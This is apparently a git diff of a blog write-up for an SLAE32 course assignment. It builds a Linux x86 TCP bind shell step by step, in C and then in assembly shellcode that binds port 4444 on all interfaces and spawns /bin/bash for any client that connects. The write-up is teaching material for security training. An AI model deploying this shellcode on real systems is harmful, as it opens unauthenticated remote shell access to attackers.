@@ -20,17 +20,19 @@ tags:
 ## Overview
 For the first Assigment of the SLAE32 course, we were tasked with creating shellcode for a TCP bind shell.  
 
-_What is shellcode?_  Shellcode is executable code that can be injected into any program, that will preform a task.  
+_What is shellcode?_   
+Shellcode is executable code that can be injected into any program, that will preform a task.  
 
 Since we need to create executable code that can be injected into a program, we will need to write this code in Assembly Language.  
-  - Assembly Language is dependant on the processor it is executing on, and the operating system.  
-For this course all Assembly will be written for Intel 32-bit Architecture, and the Linux Operating System.  
++ Assembly Language is dependant on the processor it is executing on, and the operating system.
++ For this course all Assembly will be written for Intel 32-bit Architecture, and the Linux Operating System.
 
 To map out how I was going to write Assembly Code for this assgnment, I first created a tcp bind shell using C.  
-  - C is the closest programming language to Assembly.   
++ C is the closest programming language to Assembly.
+
 Once I figured out which C functions I needed, I then had to figure out how to replace them with Linux System-Calls.  
 
-These are the C functions we need, in the order they will be executed:  
+#### Required C Funtions & Execution Flow
 1. Create Socket.
   - `int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);`
 2. Create IP-Socket Address.
@@ -72,9 +74,10 @@ int main(void)
 	execve("/bin/bash", NULL, NULL);
 }	
 ```  
+
 Great, now lets take a deeper dive into how to find all these function, and what they mean, using the linux manual (man) pages.   
 
-###socket()
+### socket()
 Our first function is `socket()`. We already know that this function is used to create a new socket. To find out more about this function we will use the command `man 7 socket` from our linux terminal.  
 ```console
 man 7 socket
@@ -92,10 +95,11 @@ Reviewing the socket() man pages we discover we will need the following values/v
 Our C socket function will be:  
         `int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);`
 
-### bind()
+### struct sockaddr\_in
 Now that our IPv4-TCP Socket has been created, we will need to create an Address for it. Then bind the Address to the Socket.  
 To create the IP Socket Address (IP + TCP Port Number), we will dig into it's man pages `man 7 ip`.  
 We find this relevant information:
+
 ```c
 An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
 struct sockaddr_in {
@@ -108,13 +112,14 @@ struct in_addr {
      uint32_t       s_addr;     /* address in network byte order */
  };
 ```
-
 From the above information, we know that we will need to use the Address Family `AF_INET`, then give it a port number (we will use TCP port 4444), and finally we will bind it to any/all interfaces using `INADDR_ANY`.  
-The struct we will use is:  
-        `struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };`  
-  - `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
-  - `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.
 
+The struct we will use is:  
+`struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };`  
++ `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
++ `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.
+
+### bind()
 Now that we have a socket, a TCP port, and an IPv4 interface, we need to `bind` them all together.  
 we will use the `bind()` C function to accomplish this, and dive into the man pages to discover the values/variables we will need, with the command `man 2 bind`.  
 ```c
@@ -201,26 +206,26 @@ need to store this array of values in reverse order.
 Once we have pushed our array of consecutive arguments onto the stack (in reverse order), all we need to 
 do is simply point the ECX register to the top of the stack.
 
-# 1. Create a Socket
+## 1. Create a Socket
 Default C Function:   `int socket(int domain, int type, int protocol);`  
 Our C Function:       `int ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );`  
                             
 EAX = 102 = 0x66 This is the value to call the SYSCAL "socketcall". We will use this for all the functions.   
 EBX = 1 = 0x1    // Value for socket() function relative to the SYSCAL "socketcall".  
 `#define SYS_SOCKET      1          // sys_socket(2)`  
-ECX[0] = AF_INET = 2 = 0x2   
-Find value of AF_INET:  
+ECX[0] = AF\_INET = 2 = 0x2   
+Find value of AF\_INET:  
 ```console
 cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_INET
     #define AF_INET         PF_INET    // We see that AF_INET is mapped to PF_INET
 ```		
-Find value of PF_INET: 
+Find value of PF\_INET: 
 ```console
 cat /usr/include/i386-linux-gnu/bits/socket.h | grep PF_INET
 	  #define PF_INET         2          // IP protocol family.
 ```  
-ECX[1] = SOCK_STREAM = 1 = 0x1   
-Find value of SOCK_STREAM: 
+ECX[1] = SOCK\_STREAM = 1 = 0x1   
+Find value of SOCK\_STREAM: 
 ```console
 cat /usr/src/linux-headers-$(uname -r)/include/linux/net.h | grep SOCK_STREAM
 				SOCK_STREAM	= 1,
@@ -246,7 +251,7 @@ xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register.
                   ;   Move it to the ESI Register; we will need it later.
 ```
 
-# 2. Create IP-Socket Address and Bind the IP-Socket Address to the Socket.  
+## 2. Create IP-Socket Address and Bind the IP-Socket Address to the Socket.  
 Default C Function:	`int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`
 Our C Function:	 
 ```c   
@@ -270,7 +275,7 @@ struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(444
                                               ARG[0]               ARG[1]                          ARG[2]
 ```  
 
-ARG[0] = AF_INET = 0x2 			// We know this value from the last SYSCAL we did.  
+ARG[0] = AF\_INET = 0x2 			// We know this value from the last SYSCAL we did.  
 	ARG[1] = htons(4444) =  0x5c11		// All this means is "4444" in Hex (0x115C), in reverse; since everything pushed to the Stack needs to be in reverse.  
 	ARG[2] = INADDR_ANY = 0x00000000	// All Network Interfaces		
 		Find value for INADDR_ANY: 
@@ -282,35 +287,42 @@ ARG[0] = AF_INET = 0x2 			// We know this value from the last SYSCAL we did.
 	ARG[2] > ARG[1] > ARG[0] > ECX[2] > ECX[1] > ECX[0]   
 
 ```nasm
-  xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
-  mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
-  xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
-  mov bl, 0x2       ; EBX is set to create a socket
-  xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
-  push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
-  push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
-  push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
-	xor ecx, ecx	    ; This sets the EAX Register to NULL (all zeros).
-	mov ecx, esp	    ; Save the memory location of ARG[0] into the EDX Register. We will use this for ECX[1].
-	push 0x10	        ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
-	push ecx	        ; ECX[1]. The pointer to the beginning of the struct we saved is now loaded up for ECX[1].
-	push esi	        ; ECX[0]. This is the value we saved from creating the Socket earlier. 
-	mov ecx, esp	    ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
-  int 0x80	        ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
+xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
+mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
+xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
+mov bl, 0x2       ; EBX is set to create a socket
+xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
+push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
+push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
+push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
+xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
+mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. We will use this for ECX[1].
+push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
+push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now loaded up for ECX[1].
+push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
+mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
+int 0x80          ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
 ```
 
-# 3. Listen for incoming connections on Socket at IP-Socket Address.  
-    Default C Function:	int listen(int sockfd, int backlog);  
-    Our C Function:		
+## 3. Listen for incoming connections on Socket at IP-Socket Address.  
+Default C Function:	
+```c
+int listen(int sockfd, int backlog);    
+```
+Our C Function:	   
 ```c
 listen( ipv4Socket, 0 );  
 EBX      ECX[0]   ECX[1]  
 ```  
-EAX = 102 = 0x66		// This is the value to call the SYSCAL "socketcall".   
-EBX = 4 = 0x4			// Value for listen() function relative to the SYSCAL "socketcall".  
-			        		#define SYS_LISTEN      4          // sys_listen(2)  
-ECX[0] = int sockfd = ESI	// The Socket we created earlier and stored in the ESI register.  
-ECX[1] = 0x0 	 		// We have no need for a backlog so this value will be 0.  
++ `EAX    = 102 = 0x66`
+  - This is the value to call the SYSCAL `socketcall`.   
++ `EBX    = 4   = 0x4`
+  - Value for `listen()` function relative to the SYSCAL `socketcall`.  
+  - `#define SYS_LISTEN  4 // sys_listen(2)`
++ `ECX[0] = int sockfd = ESI`
+  - The Socket we created earlier and stored in the `ESI` register.  
++ `ECX[1] = 0x0`
+  - We have no need for a `backlog` so this value will be `0`.  
 
 ```nasm
 xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
@@ -318,25 +330,28 @@ mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
 xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
 mov bl, 0x4      ; EBX is set to listen().
 xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
-push ecx	       ; ECX[1]. Push the value 0x0 to the stack.
+push ecx         ; ECX[1]. Push the value 0x0 to the stack.
 push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
 mov ecx, esp     ; Point ECX to the top of the stack. 
 int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.
 ```
 
-# 4. Accept the incoming connection on the listening Socket and create a new, connected socket for client.  
+## 4. Accept the incoming connection on the listening Socket and create a new, connected socket for client.  
     Default C Function: 	`int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);`  
     Our C Function:            
 ```c
 int clientSocket = accept( ipv4Socket, NULL, NULL );
                     EBX     ECX[0]    ECX[1] ECX[2]
 ```
-EAX = 102 = 0x66                // This is the value to call the SYSCAL "socketcall".  
-EBX = 5   = 0x5                 // Value for accept() function relative to the SYSCAL "socketcall".  
-`#define SYS_ACCEPT      5         // sys_accept(2)`  
-ECX[0] = int sockfd = ESI       // The Socket we created earlier and stored in the ESI register  
-ECX[1] = NULL = 0x00000000  
-ECX[2] = NULL = 0x00000000  
++ `EAX    = 102  = 0x66`
+  - This is the value to call the SYSCAL `socketcall`.  
++ `EBX    = 5    = 0x5`
+  - Value for `accept()` function relative to the SYSCAL `socketcall`.  
+  - `#define SYS_ACCEPT      5         // sys_accept(2)`  
++ `ECX[0] = int sockfd = ESI`
+  - The Socket we created earlier and stored in the ESI register  
++ `ECX[1] = NULL = 0x00000000`  
++ `ECX[2] = NULL = 0x00000000`  
        
 ```nasm
 xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
@@ -349,26 +364,32 @@ push ecx         ; ECX[1]. Push the value 0x0 to the stack.
 push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
 mov ecx, esp     ; Point ECX to the top of the stack. 
 int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets. 
-xchg ebx, eax	   ; The created clientSocket is stored in EAX after receiving a successful connection.
+xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a successful connection.
 ```
 
-# 5. Duplicate Standard Input, Standard Output, and Standard Error File-Descriptors to the newly created, connected Socket.  
- Default C Function: `int dup2(int oldfd, int newfd);`  
-    Our C Function:            
+## 5. Duplicate Standard Input, Standard Output, and Standard Error File-Descriptors to the newly created, connected Socket.  
+Default C Function:   
+```c
+int dup2(int oldfd, int newfd);  
+```
+Our C Function:            
 ```c
 dup2( clientSocket, 0 ); // STDIN
 dup2( clientSocket, 1 ); // STDOUT
 dup2( clientSocket, 2 ); // STDERR
 EAX       EBX      ECX     
 ```
-EAX = 63 = 0x3F			//  This is the value to call the SYSCAL "dup2".  
-Find Dup2 SYSCAL value:  
++ `EAX = 63 = 0x3F`
+  - This is the value to call the SYSCAL `dup2`.  
+  - Find Dup2 SYSCAL value:  
 ```console
 cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
-						#define __NR_dup2                63
+  #define __NR_dup2                63
 ```   
-EBX = int oldfd = clientSocket		// Already set with "xchg ebx, eax" after the execution of accept().  
-ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0	// Since we need to do this SYSCAL 3 times, we will use a loop.  
++ EBX = int oldfd = clientSocket
+  - Already set with `xchg ebx, eax` after the execution of `accept()`.  
++ ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0
+  - Since we need to do this SYSCAL 3 times, we will use a loop.  
 ```nasm  
   xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
   xor ecx, ecx	   ; This sets the ECX Register to NULL (all zeros). 
@@ -380,29 +401,36 @@ dup2Loop:		       ; Procedure label for the dup2 Loop.
   jns dup2Loop	   ; Jump back to the dup2Loop Procedure until ECX equals 0.
 ```  
 
-# 6. Spawn a bash shell for the client in the newly created, connected Socket that has Input, Output, and Error output.
-    Default C Function:       `int execve(const char *filename, char *const argv[], char *const envp[]);`  
-    Our C Function:           `execve("/bin/bash", NULL, NULL);`  
- Execve SysCall: In the newly created socket, execute a shell. - See "man 2 execve" for full details.  
-	`int execve(const char *filename, char *const argv[], char *const envp[]);`  
- 	Values in C program : execve("/bin/bash", NULL, NULL);  
-EAX = int execve() // System Call Number for execve  
+## 6. Spawn a bash shell for the client in the newly created, connected Socket.
+Default C Function:
+```c
+int execve(const char *filename, char *const argv[], char *const envp[]);
+```  
+Our C Function:
+```c
+execve("/bin/bash", NULL, NULL);
+```
+Execve SysCall: In the newly created socket, execute a shell. - See "man 2 execve" for full details.  
+`int execve(const char *filename, char *const argv[], char *const envp[]);`  
+
+Values in C program : execve("/bin/bash", NULL, NULL);  
+
++ `EAX = int execve() = 11`
+  - System Call Number for `execve`  
 ```console
 user$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
-			#define __NR_execve		 11	
+  #define __NR_execve		 11	
 ```  
-  EAX = 11  
-EBX = const char *filename // Pointer to string in memory storing "/bin/bash" + NULL Terminated  
-				   //	NULL Terminated ends the string "0x00"  
-  EBX = address of string ("/bin/bash" + "0x00")  
-ECX = char *const argv[]   // Array of argument strings passed to the new program.  
-				   // 	The first string should be a pointer to "/bin/bash".  
-				   //		 	#1 = Address of "/bin/bash" in memory  
-				   // 			#2 = DWORD (32bit) NULL = 0x00000000  
-  ECX = [ memory address of string "/bin/bash", 0x00000000 ]  
-EDX =  char *const envp[]  // Array of strings which are passed as environment to the new program.  
-	EDX = 0x00000000  
-    
++ `EBX = const char *filename = address of string ("/bin/bash" + "0x00")`
+  - Pointer to string in memory storing `/bin/bash` + `NULL` Terminated  
+  - `NULL` Terminated ends the string `0x00`  
++ `ECX = char *const argv[] = [ memory address of string "/bin/bash", 0x00000000 ]`
+  - Array of argument strings passed to the new program.  
+  - #1 = Address of "/bin/bash" in memory  
+  - #2 = DWORD (32bit) NULL = 0x00000000  
++ `EDX =  char *const envp[] = 0x00000000` 
+  - Array of strings which are passed as environment to the new program.
+
 ```nasm
 	push edx 	        ; NULL
 	push 0x68732f2f	  ; "hs//"
